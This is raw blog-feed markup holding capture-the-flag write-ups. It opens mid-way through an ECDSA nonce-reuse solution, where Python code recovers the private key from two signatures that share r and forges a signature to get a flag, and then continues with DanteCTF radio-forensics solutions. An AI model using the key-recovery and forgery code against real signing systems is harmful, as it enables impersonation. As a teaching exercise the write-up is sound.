class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment"># Signature (r1, s1) of the first answer</span><br>r1 = <span class="hljs-number">1465592089909096066855017733143775914413407269725815519508066282537319512650079216133639660455072377153032233958108330075714003734901092347020299988719621322</span><br>s1 = <span class="hljs-number">545531076356108942170542517291585227912890321475211086646343990428230857512990453752368923962766593723868745103465428375270149723925686204794806188631057460</span><br><br><span class="hljs-comment"># Signature (r2, s2) of the second answer</span><br>r2 = <span class="hljs-number">1465592089909096066855017733143775914413407269725815519508066282537319512650079216133639660455072377153032233958108330075714003734901092347020299988719621322</span><br>s2 = <span class="hljs-number">4189612857039624039238953485069358484257973951950638665234391677969348904883268302761678805371275339935843305522229259291269025045916960785357191121407045404</span><br><br><span class="hljs-comment"># r must be equal for this to work (this is assumed, but we check just in case)</span><br><span class="hljs-keyword">assert</span>(r1 == r2)<br><br><span class="hljs-comment"># In the Elliptic Curve Digital Signature Algorithm, if the same k is used to sign</span><br><span class="hljs-comment"># different signatures (which is the case here), the attacker can recover k using</span><br><span class="hljs-comment"># the signatures (see https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm):</span><br>m_diff = (z1 - z2) % n<br>r1_inv = inverse_mod(r1, n)<br>s_diff = (s1-s2) % n<br><br><span class="hljs-comment"># Recover k and d using the formulas from the Wikipedia page</span><br><span class="hljs-comment"># Note that division is actually multiplication by the modular inverse!!</span><br>k = (m_diff * inverse_mod(s_diff, n)) % n<br>d = (((((s1 * k) % n) - z1) % n) * r1_inv) % n<br></code></pre></td></tr></table></figure><p>Finally, we can use <code>d</code> and <code>k</code> to forge a valid signature for our own message, “hello”:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment"># Now, sign a dummy message with the calculated keys and print out the signature</span><br>m_dummy = <span class="hljs-string">&quot;hello&quot;</span><br>m_dummy_hash = <span class="hljs-built_in">int</span>(sha512(m_dummy.encode()).hexdigest(), <span class="hljs-number">16</span>)<br>P = k*G<br>r = <span class="hljs-built_in">int</span>(P[<span class="hljs-number">0</span>]) % n<br>k_inv = inverse_mod(k, n)<br>s = (((m_dummy_hash + ((r*d)%n)) % n) * k_inv) % n<br><br><span class="hljs-comment"># Print the recovered values (k &amp; d) and the forged signature (r, s) to the console</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;k = <span class="hljs-subst">&#123;k&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;d = <span class="hljs-subst">&#123;d&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;r = <span class="hljs-subst">&#123;r&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;s = <span class="hljs-subst">&#123;s&#125;</span>\n&#x27;</span>)<br></code></pre></td></tr></table></figure><p>Output:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">k</span> <span class="hljs-operator">=</span> <span class="hljs-number">3716974158814584297095537945004349475177037436869930102241594403151123939279227740076878779097835920205545515879536767635099702998888815919895730302683232744</span><br><span class="hljs-attribute">d</span> <span class="hljs-operator">=</span> <span class="hljs-number">2127236813394369802820290684263172937266777532372353713359324496964461876839310236381964658762852218580616002669515460043669806824304374603332980809612018763</span><br><span class="hljs-attribute">r</span> <span class="hljs-operator">=</span> <span class="hljs-number">1465592089909096066855017733143775914413407269725815519508066282537319512650079216133639660455072377153032233958108330075714003734901092347020299988719621322</span><br><span class="hljs-attribute">s</span> <span class="hljs-operator">=</span> <span class="hljs-number">1006240130706487892221434509613165618667388551054639964437917316108210445795964748208564217284113625941057144566952722652716045949564018952318007559836194459</span><br></code></pre></td></tr></table></figure><p>Here comes the moment of truth! Let’s submit our message <code>hello</code> and forged signature <code>(r,s)</code> to the server and see if it’s correct:<br><img src="/../images/nahamctf23/flag.PNG" alt="flag"></p><p>We got the flag! Moral of the story - <em>never</em> reuse your nonces!</p><p>Until next time…</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DanteCTF 2023 - [Radio Frequency] - Forensics</title>
    <link href="/2023/06/05/dante/"/>
    <url>/2023/06/05/dante/</url>
    
    <content type="html"><![CDATA[<h1 id="Imago-Qualitatis"><a href="#Imago-Qualitatis" class="headerlink" title="Imago Qualitatis"></a>Imago Qualitatis</h1><p><img src="/../images/dante/chall1.png" alt="Challenge"></p><div class="note note-success">            <p><strong>Difficulty:</strong> <strong>Easy</strong><br><strong>Category:</strong> <strong>Forensics</strong><br><strong>Flag:</strong> <strong><code>DANTE{n3w_w4v35_0ld_5ch00l}</code></strong></p>          </div><p>First as always , lets download the file and see what we can do. This can take sometime since its not a small download (834 MB).</p><p><img src="/../images/dante/initd1.png" alt="C0ULD N0T B3 L04AD3D"></p><p>As we can see its a 7-Zip archive, lets extract what’s inside this zip by running this command<br><strong><code>7z e ImagoQualitatis.7z</code></strong> .</p><p><img src="/../images/dante/file1.png" alt="C0ULD N0T B3 L04AD3D"></p><p>Great, we extracted the file successfully ! I checked what type of file we are working with but no useful results came up, as well as I noticed that the size of it is very large being 4.6 GB. On top of that I also checked the file header , no luck there either even after some googling. We for sure know its something to do with <strong>RF</strong> so i researched a bit on software used to open such files, and to my luck i found a software called <code>GQRX</code>, which also is mentioned in the file name !</p><p><strong>Let’s install it and give it a shot</strong></p><p><img src="/../images/dante/rad1.png" alt="C0ULD N0T B3 L04AD3D"></p><p>Interesting okay , time to try to open the file with that software and see if we get any luck, that can be done with going to <code>Tools --&gt; I/Q Recoder --&gt; Specifying the absolute path to our file</code> .</p><p><img src="/../images/dante/start1.png" alt="C0ULD N0T B3 L04AD3D"></p><p>This was something we were for sure looking for ! If there was one thing I learned from playing <code>CTFs</code> is always to be very patient while doing these type of challenges, and to no surprise after a few minutes I spotted a curly closing brace <strong>}</strong> which hints that other parts of the flag are to come.</p><p><img src="/../images/dante/br.png" alt="C0ULD N0T B3 L04AD3D"></p><p>By waiting for about 3-4 minutes,I ended up putting the pieces of the flag together character by character.In the end we got the <em>flag</em> and the first blood 🩸!</p><h1 id="Almost-Perfect-Remote-Signing"><a href="#Almost-Perfect-Remote-Signing" class="headerlink" title="Almost Perfect Remote Signing"></a>Almost Perfect Remote Signing</h1><p><img src="/../images/dante/chall2.png" alt="Challenge"></p><div class="note note-danger">            <p><strong>Difficulty:</strong> <strong>Hard</strong><br><strong>Category:</strong> <strong>Forensics</strong><br><strong>Flag:</strong> <strong><code>DANTE{FLAG_REPORTING_SYSTEM}</code></strong></p>          </div> <p>In this challenge, we are given a <code>.wav</code> file with the flag hidden somewhere inside it. Listening to the file yields nothing but ~8 seconds of what sounds like static noise, so we know the flag is encoded inside the sound data somehow. Running the file through steg tools like <strong>Binwalk</strong> and <strong>WavSteg</strong> doesn’t reveal much, and LSB analysis doesn’t show any signs of the image being encoded in the bits of the file. At this point, I opened the file in <code>Sonic Visualiser</code> to see what secrets may be encoded in the spectrogram or frequency information of the sound data. Examining the spectrogram, I saw something interesting:</p><p><img src="/../images/dante/spec.png" alt="C0ULD N0T B3 L04AD3D"></p><p>There is a faint binary signal present in the spectrogram! This discovery led me to think that the flag was encoded in the sound data in binary manner somewhow (using 0’s and 1’s). Being a novice in the area of digital signal processing, I had to do a significant amount of research to determine how this is achieved - via <a href="https://en.wikipedia.org/wiki/Frequency-shift_keying">AFSK</a> (Audio Frequency Shift Keying). In this protocol, binary data is modulated onto a continuous analog signal for long-distance transmission (e.g., radio). To decode this manually would be a real hassle, so I looked up tools to automate the process. After trying and failing with tools like <strong>GnuRadio</strong>, I stumbled upon <a href="https://www.kali.org/tools/multimon-ng/">multimon-ng</a>. This tool will demodulate the signal and output the encoded data automatically, as long as it knows the exact protocol being used. There are several AFSK protocols to choose from:</p><p><img src="/../images/dante/proto.png" alt="C0ULD N0T B3 L04AD3D"></p><p>And I ended up choosing AFSK1200 to start with (which turned out to be the right choice!).<br>This tool requires the <code>.wav</code> file to be in <code>.raw</code> format, which can be achieved using sox:</p><p><strong><code>sox -t wav aprs_out.wav -esigned-integer -b16 -r 22050 -t raw aprs_out.raw</code></strong></p><p>This command essentially takes the wave file and converts it to <code>.raw</code> format. Notice the sampling rate of 22050Hz being used here, which is the standard for these types of radio transmissions. Once this is done, we can use <strong>multimon-ng</strong> to decode the signal:</p><p><strong><code>multimon-ng -t raw -a AFSK1200 aprs_out.raw &gt; flag</code></strong></p><p>After doing those steps the decoded data looks something like this.</p><p><img src="/../images/dante/decoded.png" alt="C0ULD N0T B3 L04AD3D"></p><p>We are definitely on the right track - we can see “Hello flag!” in every packet. If we scrutinize the data closely, we can see that there are slightly different coordinates used in each packet transmission:</p><p><img src="/../images/dante/decoded2.png" alt="C0ULD N0T B3 L04AD3D"></p><p>Is the flag encoded in these coordinates somehow? Plotting these coordinates on a Cartesian coordinate system yields:</p><p><img src="/../images/dante/plane.png" alt="C0ULD N0T B3 L04AD3D"></p><p>It’s not pretty, but zooming in around small groups of characters can help us read the flag characters:</p><p><img src="/../images/dante/plane2.png" alt="C0ULD N0T B3 L04AD3D"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
